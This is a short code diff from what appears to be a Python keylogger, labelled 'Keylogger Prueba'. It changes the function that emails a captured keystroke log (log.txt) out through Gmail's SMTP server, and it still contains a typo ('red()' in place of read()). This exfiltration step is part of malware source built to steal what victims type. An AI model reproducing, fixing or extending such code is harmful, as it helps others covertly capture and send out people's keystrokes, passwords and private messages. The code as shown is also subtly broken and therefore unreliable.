@@ -21,7 +21,7 @@ def enviar_datos():
     msg['From'] = "example@example.com"
     msg['To'] = "example@example.com"
     msg['Subject'] = "Keylogger Prueba"
-    msg.attach(MIMEText(file('log.txt').red()))
+    msg.attach(MIMEText(open('log.txt').red()))
 
     try:
         server = smtplib.SMTP('smtp.gmail.com:587')
